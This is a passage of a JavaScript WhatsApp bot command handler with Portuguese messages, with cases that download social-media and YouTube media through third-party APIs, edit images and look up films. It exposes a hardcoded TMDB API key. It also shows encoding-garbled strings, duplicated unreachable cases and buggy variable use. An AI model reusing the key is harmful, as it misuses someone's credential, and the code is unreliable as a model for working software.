        }, { quoted:  {key: {fromMe: false, participant: `${sender}`}, message: {conversation: `Gleyson Devs Domina`}} });
      });
    })
    .catch(err => {
      console.error(err);
      reply('SCRAPER FALHOY');
    });//criador da case: nunu & franky x
  break;//criador da case: nunu & franky x
  
case 'ytmp3-2':
try {
const Ayushplaymusica = require('./yoko/bunker/modulo_play/ytdl2.js')
const pl = await Ayushplaymusica.mp3(q)
if (!pl || !yoko.meta) {
return await reply(`âŒ NÃ£o foi possÃ­vel recuperar informaÃ§Ãµes da mÃºsica.`)
}
await reply('```âœ… MÃºsica encontrada! Enviando...```')
const { title, channel, seconds, image } = yoko.meta

await yoko.sendMessage(from, { audio: fs.readFileSync(yoko.path), fileName: title + '.mp3', mimetype: 'audio/mp4', ptt: false }, { quoted: info })

} catch(e) {
console.log(e)
}
break

case 'ytmp3-3':
try {
if(!q) return reply('TA QUERENDO BAIXAR O QUE?')
await downloadAudio(q)
await sleep(4000)
await yoko.sendMessage(from, { audio: fs.readFileSync('./yoko/bunker/modulo_play/ytdl3_audio/audio/TempMusic.mp3'), fileName: 'yoko.mp3', mimetype: 'audio/mp4', headerType: 4,
 contextInfo: {
 externalAdReply: {
 title: 'AYANOKOJI V1 MD',
 showAdAttribution: true,
 thumbnailUrl: 'https://pomf2.lain.la/f/y6gwa233.png',
 mediaType: 1,
 renderLargerThumbnail: true,
 mediaUrl: `instagram.com`,
 sourceUrl: `https://Youtube.com`
 }
 } }, { quoted: info })
} catch(e) {
console.log(e)
}
break

case 'ytmp4-1':
try {
const ytdlv = require("@distube/ytdl-core");

  if (!q) return reply('Coloque o nome da mÃºsica tambÃ©m');
  reply("ğŸ—¡ consegue esperar 2 minutos? mandando...");//criador da case: nunu & franky x

  const searchUrl = q
  fetch(searchUrl)
    .then(response => response.text())
    .then(body => {
      const videoId = body.match(/"videoId":"(.*?)"/)[1];
      const videoUrl = `http://www.youtube.com/watch?v=${videoId}`;
      return ytdlv(videoUrl, { filter: 'videoandaudio' });
    })//criador da case: nunu & franky x
    .then(stream => {
      const chunks = [];
      stream.on('data', chunk => chunks.push(chunk));
      stream.on('end', () => {
        const audioBuffer = Buffer.concat(chunks);
        yoko.sendMessage(from, {
          video: audioBuffer,
          caption: 'â™¦ï¸â¯â¯ğ˜¼ğ™‰ğ™‰ğ˜¼ ğ™‘6 ğ™ğ™‡ğ™ğ™ğ˜¼â®â®â™¦ï¸'
        }, { quoted:  {key: {fromMe: false, participant: `${sender}`}, message: {conversation: `Gleyson Devs Domina`}} });
      });
    })
    .catch(err => {
      console.error(err);
      reply('SCRAPER FALHOY');
    });
    } catch(e) {
    console.log(e)
    }
  break;
  
case 'ytmp4-2':
try {
const Ayushplaymusica = require('./yoko/bunker/modulo_play/ytdl.js')
const pl = await Ayushplaymusica.video(q)
if (!pl || !yoko.meta) {
return await reply(`âŒ NÃ£o foi possÃ­vel recuperar informaÃ§Ãµes da mÃºsica.`)
}
await reply('```âœ… MÃºsica encontrada! Enviando...```')
const { title, channel, seconds, image } = yoko.meta

await yoko.sendMessage(from, { video: fs.readFileSync(yoko.path), caption: 'â™¦ï¸â¯â¯ğ˜¼ğ™‰ğ™‰ğ˜¼ ğ™‘6 ğ™ğ™‡ğ™ğ™ğ˜¼â®â®â™¦ï¸'}, { quoted: info })

} catch(e) {
console.log(e)
}
break

case 'ytmp4-3':
try {
if(!q) return reply('TA QUERENDO BAIXAR O QUE?')
await downloadVideo(q)
await sleep(4000)
await yoko.sendMessage(from, { video: fs.readFileSync('./yoko/bunker/modulo_play/ytdl3_video/video/TempMusic.mp4'), caption: 'â™¦ï¸â¯â¯ AYANOKOJI MD â®â®â™¦ï¸' }, { quoted: info })
} catch(e) {
console.log(e)
}
break

case 'playvideo':
case 'Playvideo':

try {

if(!q) return reply(`Coloque o nome do video`)

let api = await fetchJson(`https://zero-two.online/api/ytsrc?q=${q}&apikey=YOKO_BOT_BETA_V6.3.0.0`)

reply(" Baixando o video solicitado.. ")

await yoko.sendMessage(from, 
{video: 
{url: `https://zero-two.online/api/dl/ytvideo2?url=${api.resultado[0].url}&apikey=YOKO_BOT_BETA_V6.3.0.0`},
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitaÃ§Ã£o ")
}
break

case 'ytdoc':
case 'playdoc':
if(!q) return reply(mess.syntaxDownloadMusic());
await reply(`â–§âƒ¯âƒŸğ™´ğš—ğšŸğš’ğšŠğš—ğšğš˜ ğ™³ğš˜ğšŒğšğš–ğšğš—ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
try {
await yoko.sendMessage(from, {document: {url: `https://api.bronxyshost.com.br/api-bronxys/play_video?nome_url=${q}&apikey=${API_KEY_BRONXYS}`}, fileName: 'â¯â¯YOKO ğ™‘6 SYSTEMâ®â®.mp3', mimetype: "audio/mpeg"}, {quoted: selo}).catch(async(error) => {
return reply(mess.error())
})
} catch(error) {
reply("Seja mais especÃ­fico, nÃ£o deu pra encontrar com apenas isto...");
}
break

case 'ytmp3':
case 'playaudio':
if(!q) return reply(mess.syntaxDownloadMusic());
await reply(`â¯â¯BAIXANDO AGUARDE..â®â®`)
try {
await sleep(500)
await yoko.sendMessage(from, {audio: {url: `https://api.bronxyshost.com.br/api-bronxys/play?nome_url=${q}&apikey=${API_KEY_BRONXYS}`}, fileName: 'YOKO BOT V6', mimetype: "audio/mpeg", headerType: 1,
 contextInfo: {
 externalAdReply: {
 title: 'YOKO BOT',
 showAdAttribution: true,
 thumbnailUrl: 'https://dl.dropboxusercontent.com/scl/fi/obar9ku3jrfxodbov9pqp/1741800677648.jpeg?rlkey=un9x96crynqcdib5n5qwi427u&dl=0',
 mediaType: 4,
 renderLargerThumbnail: true,
 mediaUrl: `instagram.com`,
 sourceUrl: `https://Youtube.com`
 }
 } }, {quoted: {key: {fromMe: false, participant: `${sender}`}, message: {conversation: `Gleyson Devs Domina`}} }).catch(async(error) => {
return reply(mess.error())
})
} catch(error) {
reply('Teve um erro aqui');
}
break



case 'toanime': 
case 'imagepraanime':
if((isMedia && !info.message.videoMessage || isQuotedImage)) {
try {
dlmedia = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage;
owgi = await getFileBuffer(dlmedia, 'image');
uploadServer = await uploader.pixhost(owgi)
reply("Aplicando o efeito de anime na imagem");
let ToanimeUrl = await getBuffer(`https://carisys.online/api/outros/toanime?url=${uploadServer.resultado}`)
await yoko.sendMessage(from, {image: ToanimeUrl}, {quoted: selo})
} catch (e) {
return reply("Deu um pequeno erro, tente novamente mais tarde..");
}
} else {
reply("Mencione uma imagem para atribuÃ­r o efeito.");
}
break;

case 'gtaia': case 'togta': case 'imgpragta':
if((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat([base64, send ]) }
reply(`Criando seu avatar, aguarde! NÃ£o vai demorar muito amiguinho(a)...ï¸`)
link = await upload(base64);
dataConvertAndreas = await fetchJson(`https://aemt.me/jadigta?url=${link}`)
await yoko.sendMessage(from, {image: {url: dataConvertAndreas.result}}, {quoted: selo})
.catch(async(error) => {
return reply(`NÃ£o foi possÃ­vel criar seu avatar! Por favor, tente com outra imagem!`);
})
} else {
reply('Mencione uma imagem para atribuir o efeito a foto.')
}
break

case 'tozombie': case 'zombieai': case 'imgprazombie':
if((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat([base64, send ]) }
reply(`Criando seu avatar, aguarde! NÃ£o vai demorar muito amiguinho(a)...ï¸`)
link = await upload(base64);
dataConvertZombie = await fetchJson(`https://aemt.me/converter/zombie?url=${link}`);
await yoko.sendMessage(from, {image: {url: dataConvertZombie.url}}, {quoted: selo})
.catch(async(error) => {
return reply(`NÃ£o foi possÃ­vel criar seu avatar! Por favor, tente com outra imagem!`);
})
} else {
reply('Mencione uma imagem para atribuir o efeito a foto.')
}
break

case 'enhance': case 'dehaze': case 'recolor':
if((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat([base64, send])}
data = await vyroEngine(base64, command);
await yoko.sendMessage(from, {image: data}, {quoted: selo}).catch(async(error) => {
return reply(mess.error())
})
} else {
reply('Mencione uma imagem para atribuir o efeito a foto.')
}
break

case 'movie':
if (args.length == 0) return reply(`CadÃª o nome do filme o qual vocÃª deseja ver informaÃ§Ãµes?`)
movieInfo = await axios.get(`https://api.themoviedb.org/3/search/movie?api_key=ddfcb99fae93e4723232e4de755d2423&query=${encodeURIComponent(q)}&language=pt`);
if (movieInfo.data.total_results == 0) return reply(mess.noresult())
var ImageMovieLink = `https://image.tmdb.org/t/p/original${movieInfo.data.results[0].backdrop_path}`;
var fotoFilme = await getBuffer(ImageMovieLink)
yoko.sendMessage(from, {image: fotoFilme, caption: mess.movies(movieInfo)}, {quoted: selo})
.catch(async(error) => {
return reply(mess.error());
})
break

case 'spoiler': case 'morechat':
var [text1_a, text2_b] = q.split("/"); // Separador
if (!text1_a) text1_a = ""; // Caso o texto1 esteja vazio, vai retornar vÃ¡zio o parÃ¢metro.
if (!text2_b) text2_b = ""; // Caso o texto2 esteja vazio, vai retornar vÃ¡zio o parÃ¢metro.
reply(text1_a + String.fromCharCode(8206).repeat(4001) + text2_b); // Enviar o spoiler.
break

case 'obesidade': case 'obeso':
if(!q.includes("/")) return reply(`Ex.: *${prefix+command} peso/altura*`)
var [peso, altura] = q.split("/");
var resultado = await obeso(peso, altura)
if (resultado <= 17 || resultado <= 18.4) {
await replyWithReaction(`â€¢ Seu Ã­ndice de massa corporal Ã© de: *${resultado}* -> VocÃª estÃ¡ abaixo do peso.`, {react: {text: 'ğŸ˜¸', key: info.key}});
} else if (resultado <= 18.5 || resultado <= 24.9) {
await replyWithReaction(`â€¢ Seu Ã­ndice de massa corporal Ã©: *${resultado}* -> VocÃª estÃ¡ no peso ideal.`, {react: {text: 'ğŸ‘', key: info.key}});
} else if (resultado <= 25 || resultado <= 29.9) {
await replyWithReaction(`â€¢ Seu Ã­ndice de massa corporal Ã©: *${resultado}* -> VocÃª estÃ¡ com sobrepeso.`, {react: {text: 'ğŸ«¤', key: info.key}});
} else if (resultado <= 30 || resultado <= 39.9) {
await replyWithReaction(`â€¢ Seu Ã­ndice de massa corporal Ã©: *${resultado}* -> Em situÃ§Ã£o de Obesidade.`, {react: {text: 'ğŸ¤¨', key: info.key}});
} else if (resultado > 40) {
await replyWithReaction(`â€¢ Seu Ã­ndice de massa corporal Ã©: *${resultado}* -> Obesidade mÃ³rbida!`, {react: {text: `ğŸ˜µ`, key: info.key}});
}
break

case 'contardias': case 'countdays':
if(!q.includes("/")) return reply(`VocÃª esqueceu da */* para separar os campos.. Exemplo: *31/03/2024*`)
if(q.length < 10) return reply(`Deve conter a data completa *(dia/mÃªs/ano)* apÃ³s o comando!\nâ€¢ Exemplo: *${prefix+command} 31/03/2024*`)
try {
var tomp = await timeDate('DD/MM/YYYY')
countDay = await countDays(q.split("/"), tomp.split("/"))
reply(`*${countDay}* dia(s).`)
} catch(error) {
return reply(mess.error())
}
break

case 'qrcode': case 'gerarqr':
if (!q) return reply('Insira um link ou texto para que eu possa gerar o qr code..')
try {
await yoko.sendMessage(from, {image: {url: `https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${q}`}, caption: `ğŸ’«| ğ’ğğ® ğªğ« ğœğ¨ğğ ğŸğ¨ğ¢ ğ ğğ«ğšğğ¨ ğœğ¨ğ§ğ­ğğ§ğğ¨ ğ¨ ğ­ğğ±ğ­ğ¨/ğ®ğ«ğ¥ ğğ¬ğ©ğğœğ¢ğŸğ¢ğœğšğğ¨ ğšğ¨ ğ¥ğšğğ¨: *${q}*`}, {quoted: selo})
} catch (e) {
return reply(mess.error());
}
break

case 'serie':
if (args.length == 0) return reply(`CadÃª o nome da serie o qual vocÃª deseja ver informaÃ§Ãµes?`)
serieInfo = await axios.get(`https://api.themoviedb.org/3/search/tv?api_key=ddfcb99fae93e4723232e4de755d2423&query=${encodeURIComponent(q)}&language=pt`);
if (serieInfo.data.total_results == 0) return reply(mess.noresult());
await yoko.sendMessage(from, {image: {url: `https://image.tmdb.org/t/p/original${serieInfo.data.results[0].backdrop_path}`}, caption: mess.series(serieInfo)}, {quoted: selo})
.catch(async(error) => {
return reply(mess.error())
})
break

case 'aptoide':
if (args.length == 0) return reply(`CadÃª o nome do app? *Use como exemplo:* ${prefix+command} WhatsApp.`)
try {
const aptoide = await axios.get(`https://ws75.aptoide.com/api/7/apps/search?query=${encodeURIComponent(q)}&trusted=true`);
if (aptoide.data.datalist.total == 0) return reply(mess.noresult());
phAptoide = await(await fetch(aptoide.data.datalist.list[0].graphic)).buffer();
lnDown = await axios.get(`https://tinyurl.com/api-create.php?url=${aptoide.data.datalist.list[0].file.path_alt}`);
await yoko.sendMessage(from, {image: phAptoide, caption: mess.aptoide(aptoide.data.datalist.list[0], (aptoide.data.datalist.list[0].size / 1048576).toFixed(1), lnDown)}, {quoted: selo}); 
await yoko.sendMessage(from, {document: {url: aptoide.data.datalist.list[0].file.path}, mimetype: "application/vnd.android.package-archive", fileName: `${aptoide.data.datalist.list[0].name}.apk`, caption: "Download Completo!"}, {quoted: selo})
} catch(error) {
return reply(mess.error())
}
break


case 'tiktok':
case 'tiktok_video':
try {
if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`);
reply("Realizando aÃ§Ã£o..");
yoko.sendMessage(from, {video: {url:`https://api.nexfuture.com.br/api/downloads/tiktok/dl?url=${q}`}, mimetype: "video/mp4"}, {quoted: info}).catch(e => {
console.log(e)
return reply("Erro..")
})
} catch (e) {
console.log(e)
return reply("Erro...");
}
break;

case 'tiktok2':
case 'tiktok_audio':
try {
if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`);
reply("Realizando aÃ§Ã£o..");
yoko.sendMessage(from, {audio: {url:`https://zero-two.online/download/tiktok?url=${q}&apikey=YOKO_BETA`}, mimetype: "audio/mpeg"}, {quoted: info}).catch(e => {
console.log(e)
return reply("Erro..")
})
} catch (e) {
console.log(e)
return reply("Erro...");
}
break;

case 'facebook': 
if (!q) return reply(`Por favor, adicione um link do Facebook`);
try {
reply(`á¶œá´¬á´¸á´¹á´¬ á´¬á´µ á´¬ Ê¸á´¼á´·á´¼ áµ€á´¬ á´®á´¬á´µË£á´¬á´ºá´°á´¼ Ë¢á´±áµ â±½á´µá´°á´±á´¼ á´¹á´¬á´ºá´¼...`);

api = await fetchJson(`https://api.nexfuture.com.br/api/downloads/facebook/dl?url=${encodeURIComponent(q)}`);

await yoko.sendMessage(from, {video: {url: api.resultado.data[0].url}, mimetype: "video/mp4"}, {quoted: info})
} catch(error) {
return reply(`Deu um pequeno erro, tente novamente mais tarde`)
}
break

case 'faceaudio':
try {
if(!q) return reply(`Coloque o link do Facebook`);
reply(`Realizando o download do audio...`);

await yoko.sendMessage(from, {audio: {url:`https://api.nexfuture.com.br/api/downloads/facebook/mp3?url=${encodeURIComponent(q)}`}, mimetype: "audio/mpeg"}, 
{quoted: info})
} catch (error) {
console.log(error)
return reply(`Deu um pequeno erro, tente novamente mais tarde`)
}
break

case 'twitter_video':
try {
if(!q.includes("twitter")) return reply(`Exemplo: ${prefix+command} o link do Twitter`);
reply("Realizando aÃ§Ã£o..")
yoko.sendMessage(from, {video: {url: `https://api.bronxyshost.com.br/api-bronxys/${command}?url=${q}&apikey=${API_KEY_BRONXYS}`}, mimetype: "video/mp4"}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break;

case 'twitter_audio':
try {
if(!q.includes("twitter")) return reply(`Exemplo: ${prefix+command} o link do Twitter`);
reply("Realizando aÃ§Ã£o..")
yoko.sendMessage(from, {audio: {url: `https://api.bronxyshost.com.br/api-bronxys/${command}?url=${q}&apikey=${API_KEY_BRONXYS}`}, mimetype: "audio/mpeg"}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break;

case 'instagram': 
if(!q) return reply(`Por favor, adicione um link do Instagram`);
try {
reply(`Realizando o download do vÃ­deo...`);
api = await fetchJson(`https://api.nexfuture.com.br/api/downloads/instagram/dl?url=${encodeURIComponent(q)}`);
 
await yoko.sendMessage(from, {video: {url: api.resultado.data[0].url}, mimetype: "video/mp4"}, {quoted: info})
} catch(error) {
return reply(`Deu um pequeno erro, tente novamente mais tarde`)
}
break

case 'insta_audio':
case 'instaaudio': case 'igaudio': case 'insta_audio':
try {
if(!q.trim()) return reply(`Exemplo: ${prefix+command} o link`);
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/instagram?url=${q.trim()}&apikey=${API_KEY_BRONXYS}`)
reply("AGUARDE, REALIZANDO AÃ‡ÃƒO.")
let DM_T = ABC.msg[0].type
var A_T = DM_T === "webp" ? "image/webp" : DM_T === "jpg" ? "image/jpeg" : DM_T === "mp3" ? "audio/mpeg" : "audio/mpeg"
yoko.sendMessage(from, {[A_T.split("/")[0]]: {url: ABC.msg[0].url}, mimetype: A_T}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break;

case 'mediafire':
try {
if(!q.includes("mediafire.com")) return reply("Faltando o link do mediafire para download do arquivo, cade?");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/mediafire?url=${q}&apikey=${API_KEY_BRONXYS}`)
reply(`Enviando: ${ABC.resultado[0].nama}\n\nPeso: ${ABC.resultado[0].size}`)
yoko.sendMessage(from, {document: {url: ABC.resultado[0].link}, mimetype: "application/"+ABC.resultado[0].mime, fileName: ABC.resultado[0].nama}).catch(e => {
return reply("Erro..");
})
} catch (e) {
console.log(String(e))
return reply("Erro..")
}
break;
case "ifunny": {
if(!q.trim()) return reply(`Faltando link do ifunny, Exemplo: https://br.ifunny.co/video/w9Eaa2bOB?s=cl`)
try {
yoko.sendMessage(from, {video: {url: `https://api.bronxyshost.com.br/api-bronxys/ifunny?url=${q.trim()}&apikey=${API_KEY_BRONXYS}`}, mimetype: "video/mp4"}, {quoted: info})
} catch (e) {
console.log(e)
reply("Erro...")
}
}
break;

case "transcrever": {
if((isMedia && !info.message.imageMessage && info.message.videoMessage || isQuotedVideo || isQuotedAudio)) {
reply("Aguarde.. transcrevendo seu Ã¡udio..")
muk = isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.videoMessage : isQuotedAudio ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.audioMessage : info.message.audioMessage

let base64String = await getFileBuffer(muk, isQuotedAudio ? 'audio': 'video');
let buffer = Buffer.from(base64String, 'base64');

let formData = new FormData();
formData.append('file', buffer, {filename: isQuotedAudio ? 'audiofile': 'videofile', contentType: muk.mimetype });

fetch(`https://api.bronxyshost.com.br/transcrever?apikey=${API_KEY_BRONXYS}`, {
method: 'POST',
body: formData
}).then(response => response.json())
.then(data => {
reply(data.texto);
}).catch((Err) => {
console.log(Err);
reply("Sinto muito, alguns formatos de Ã¡udio/vÃ­deo, eu nÃ£o consigo transcrever, em caso de dÃºvidas, tente novamente...");
});
} else {
return reply("Marque um audio ou um vÃ­deo.")
}
}
break;

case 'grupos': {
reply("Realizando aÃ§Ã£o, aguarde.")
blue = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/grupos?q=${q}&apikey=${API_KEY_BRONXYS}`)
let red = "Listagem de grupos para vocÃª:\n\n"
blue.forEach(function(ab) {
red += ` - Url do Grupo: ${ab.link}\n\n - DescriÃ§Ã£o: ${ab.desc}\n\n${"-".repeat(20)}\n\n`
})
reply(red)
}
break;

case 'kwai':
try {
response2 = await fetch(`https://api.nexfuture.com.br/api/downloads/kwai/dl?url=${encodeURIComponent(q)}`);
data = await response2.json();

  if (data && data.length > 0) {
    const videoUrl = data[0].video;
    yoko.sendMessage(from, {
    video: {url: `${videoUrl}`,
    caption: 'Aqui estÃ¡ seu vÃ­deo ğŸ¥µ'
    }})
  } else {
    reply('NÃ£o foi possÃ­vel obter o URL do vÃ­deo.');
  }
} catch (error) {
  console.log(error);
  reply('Deu Erro Api Ai Ã“ ğŸ¤“');
}
break;

case 'spotify': {
if(!q.trim().includes("spotify")) return reply(`CadÃª a url do spotiy? exemplo: ${prefix+command} https://open.spotify.com/intl-pt/track/4m3mrHuttXhK58f6Tenai1\nNÃ£o baixo playlist, quiser pegar o link da mÃºsica, acessa o site: https://open.spotify.com/search e pesquisa lÃ¡.`)
reply('AGUARDA UM INSTANTE');
try {
yoko.sendMessage(from, {audio: {url: `https://api.bronxyshost.com.br/api-bronxys/spotify?url=${q.trim()}&apikey=${API_KEY_BRONXYS}`}, mimetype: "audio/mpeg"}, {quoted: info}).catch(() => reply("Erro!"))
} catch (e) {
console.log(e);
return reply("Erro...");
}
}
break;

case "aptoide_pesquisa":
if(!q.trim()) return reply("Exemplo: WhatsApp")
try {
abc = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/aptoide_pesquisa?pesquisa=${q.trim()}&apikey=${API_KEY_BRONXYS}`)
reply(abc.aptoide)
} catch (e) {
console.log(e)
return reply("Erro...")
}
break;

case "aptoide":
if(!q.trim().includes("aptoide.com")) return reply(`Exemplo: ${prefix+command} link do aptoide\n\nUse o comando ${prefix}aptoide_pesquisa Exemplo: whatsapp, ae vai receber as url, pegue a url e use.`)
reply('AGUARDA UM INSTANTE')
try {
abc = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/aptoide?url=${q.trim()}&apikey=${API_KEY_BRONXYS}`)
yoko.sendMessage(from, {document: {url: abc.link}, mimetype: "application/vnd.android.package-archive", fileName: abc.titulo}, {quoted: info}).catch((e) => console.log(e))
} catch (e) {
console.log(e)
return reply("Erro...")
}
break;

// DOWNLOADS

/*case 'play': {
try {
if(!q.trim()) return reply(`- Exemplo: ${prefix}play nome da mÃºsica\na mÃºsica serÃ¡ baixada, sÃ³ basta escolher Ã¡udio ou vÃ­deo, se nÃ£o baixar, o YouTube privou de nÃ£o baixarem, ou algo do tipo..`)
data = await fetchJson(`https://zero-two.online/api/ytsrc?q=${q}&apikey=${API_KEY_YOKO}`)
if(data[0]?.tempo?.length >= 7) return reply("Desculpe, este video ou audio Ã© muito grande, nÃ£o poderei realizar este pedido, peÃ§a outra mÃºsica abaixo de uma hora.")
var N_E = " NÃ£o encontrado."
var bla = `
à¹–Û£â€¢ Titulo: ${data[0]?.titulo||N_E}
à¹–Û£â€¢ Tempo: ${data[0]?.tempo||N_E}
à¹–Û£â€¢ Postado: ${data[0]?.postado||N_E}
à¹–Û£â€¢ DescriÃ§Ã£o: ${data[0]?.desc||N_E}

â– â– â– â– â–  100% 

Eá¥‰á¥´á¥†á¥£há¥² á¥™ê§‘á¥² á¥†Ïá¥´á¥²á¥†...

Se desejar baixar o video, use ${prefix}play_video ${q.trim()}
`
yoko.sendMessage(from, {image: {url: data[0]?.thumb || logoslink?.logo}, caption: bla}, {quoted: info})
yoko.sendMessage(from, {audio: {url: `https://zero-two.online/api/dl/ytaudio3?url=${q}&apikey=${API_KEY_YOKO}`}, mimetype: "audio/mpeg", fileName: data[0]?.titulo || "play.mp3"}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} catch (e) {
console.log(e)
return reply("Seja mais especÃ­fico, nÃ£o deu pra encontrar com apenas isto... / Erro");
}
}
break;*/

case 'playmp4':  case "play_video": {
try {
if(!q.trim()) return reply(`- Exemplo: ${prefix}play nome da mÃºsica\na mÃºsica serÃ¡ baixada, sÃ³ basta escolher Ã¡udio ou vÃ­deo, se nÃ£o baixar, o YouTube privou de nÃ£o baixarem, ou algo do tipo..`)
data = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/pesquisa_ytb?nome=${q}&apikey=${API_KEY_BRONXYS}`)
if(data[0]?.tempo?.length >= 7) return reply("Desculpe, este video ou audio Ã© muito grande, nÃ£o poderei realizar este pedido, peÃ§a outra mÃºsica abaixo de uma hora.")
var N_E = " NÃ£o encontrado."
var bla = `
à¹–Û£â€¢ Titulo: ${data[0]?.titulo||N_E}
à¹–Û£â€¢ Tempo: ${data[0]?.tempo||N_E}
à¹–Û£â€¢ Postado: ${data[0]?.postado||N_E}
à¹–Û£â€¢ DescriÃ§Ã£o: ${data[0]?.desc||N_E}

â– â– â– â– â–  100% 

Eá¥‰á¥´á¥†á¥£há¥² á¥™ê§‘á¥² á¥†Ïá¥´á¥²á¥†...

Se desejar baixar o Ã¡udio, use ${prefix}play ${q.trim()}
`
yoko.sendMessage(from, {image: {url: data[0]?.thumb || logoslink?.logo}, caption: bla}, {quoted: info})
yoko.sendMessage(from, {video: {url: `https://api.bronxyshost.com.br/api-bronxys/play_video?nome_url=${q}&apikey=${API_KEY_BRONXYS}`}, mimetype: "video/mp4", fileName: data[0]?.titulo || "play.mp4"}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} catch (e) {
console.log(e)
return reply("Seja mais especÃ­fico, nÃ£o deu pra encontrar com apenas isto... / Erro");
}
}
break;

case 'playdoc':
try {
if(!q.trim()) return reply(`- Exemplo: ${prefix}play nome da mÃºsica\na mÃºsica serÃ¡ baixada, sÃ³ basta escolher Ã¡udio ou vÃ­deo, se nÃ£o baixar, o YouTube privou de nÃ£o baixarem, ou algo do tipo..`)
data = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/pesquisa_ytb?nome=${q}&apikey=${API_KEY_BRONXYS}`)
if(data[0]?.tempo?.length >= 7) return reply("Desculpe, este video ou audio Ã© muito grande, nÃ£o poderei realizar este pedido, peÃ§a outra mÃºsica abaixo de uma hora.")
var N_E = " NÃ£o encontrado."
var bla = `
à¹–Û£â€¢ Titulo: ${data[0]?.titulo||N_E}
à¹–Û£â€¢ Tempo: ${data[0]?.tempo||N_E}
à¹–Û£â€¢ Postado: ${data[0]?.postado||N_E}
à¹–Û£â€¢ DescriÃ§Ã£o: ${data[0]?.desc||N_E}

â– â– â– â– â–  100%

Enviando documento...

Se deseja baixar o video, use ${prefix}playmp4 ${q.trim()}

Se deseja baixar o Ã¡udio, use ${prefix}play ${q.trim()}
`
yoko.sendMessage(from, {image: {url: data[0]?.thumb || logoslink.logo}, caption: bla}, {quoted: info})
yoko.sendMessage(from, {document: {url: `https://api.bronxyshost.com.br/api-bronxys/play?nome_url=${q}&apikey=${API_KEY_BRONXYS}`}, mimetype: "audio/mpeg", fileName: data[0]?.titulo || "play.mp3"}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} catch (e) {
console.log(e)
return reply("Seja mais especÃ­fico, nÃ£o deu pra encontrar com apenas isto... / Erro");
}
break;

case 'tiktok_video':
try {
if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`);
reply("Realizando aÃ§Ã£o..");
yoko.sendMessage(from, {video: {url:`https://api.bronxyshost.com.br/api-bronxys/tiktok?url=${q}&apikey=${API_KEY_BRONXYS}`}, mimetype: "video/mp4"}, {quoted: info}).catch(e => {
console.log(e)
return reply("Erro..")
})
} catch (e) {
console.log(e)
return reply("Erro...");
}
break;

case 'tiktok_audio':
try {
if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`);
reply("Realizando aÃ§Ã£o..");
yoko.sendMessage(from, {audio: {url:`https://api.bronxyshost.com.br/api-bronxys/tiktok?url=${q}&apikey=${API_KEY_BRONXYS}`}, mimetype: "audio/mpeg"}, {quoted: info}).catch(e => {
console.log(e)
return reply("Erro..")
})
} catch (e) {
console.log(e)
return reply("Erro...");
}
break;

case 'face_video':
try {
if(!q.includes("facebook") && !q.includes("fb.watch")) return reply(`Exemplo: ${prefix+command} o link do Facebook`);
reply("Realizando aÃ§Ã£o..")
yoko.sendMessage(from, {video: {url: `https://api.bronxyshost.com.br/api-bronxys/${command}?url=${q}&apikey=${API_KEY_BRONXYS}`}, mimetype: "video/mp4"}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break;

case 'face_audio':
try {
if(!q.includes("facebook") && !q.includes("fb.watch")) return reply(`Exemplo: ${prefix+command} o link do Facebook`);
reply("Realizando aÃ§Ã£o..")
yoko.sendMessage(from, {audio: {url: `https://api.bronxyshost.com.br/api-bronxys/${command}?url=${q}&apikey=${API_KEY_BRONXYS}`}, mimetype: "audio/mpeg"}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break;

case 'twitter_video':
try {
if(!q.includes("twitter")) return reply(`Exemplo: ${prefix+command} o link do Twitter`);
reply("Realizando aÃ§Ã£o..")
yoko.sendMessage(from, {video: {url: `https://api.bronxyshost.com.br/api-bronxys/${command}?url=${q}&apikey=${API_KEY_BRONXYS}`}, mimetype: "video/mp4"}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break;

case 'twitter_audio':
try {
if(!q.includes("twitter")) return reply(`Exemplo: ${prefix+command} o link do Twitter`);
reply("Realizando aÃ§Ã£o..")
